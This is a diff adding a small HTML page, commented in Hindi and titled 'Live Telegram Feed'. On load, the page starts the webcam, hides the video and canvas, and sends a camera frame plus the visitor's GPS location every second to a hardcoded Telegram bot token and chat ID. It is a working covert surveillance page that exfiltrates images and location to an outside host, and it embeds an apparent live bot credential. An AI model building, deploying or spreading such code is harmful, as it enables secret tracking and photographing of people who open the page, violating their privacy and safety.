@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <title>Live Telegram Feed</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 40px; }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <h1>Live Feed Telegram पर भेजा जा रहा है...</h1>
+
+  <video id="video" autoplay playsinline width="300" height="225"></video>
+  <canvas id="canvas" width="300" height="225"></canvas>
+
+  <script>
+    const botToken = "7549281756:AAE_5JMYxK3UnX3KIRxWvgEkXKrFaS9hVZ4";
+    const chatId = "5743927668";
+
+    let videoStream = null;
+
+    async function startCamera() {
+      const video = document.getElementById("video");
+      videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = videoStream;
+    }
+
+    async function captureAndSend() {
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+      const video = document.getElementById("video");
+
+      // कैप्चर करो
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+
+      // लोकेशन लो
+      navigator.geolocation.getCurrentPosition(async position => {
+        // Send Location (हर बार भेजना भारी है — आप 5 सेकंड या 10 सेकंड में कर सकते हो)
+        await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          })
+        });
+
+        // Send Photo
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", photoBlob, "frame.jpg");
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+
+      }, error => {
+        console.error("Location Error:", error.message);
+      });
+    }
+
+    async function startSending() {
+      await startCamera();
+      // हर 1 सेकंड में भेजें (1000ms)
+      setInterval(captureAndSend, 1000);
+    }
+
+    window.onload = startSending;
+  </script>
+</body>
+</html>
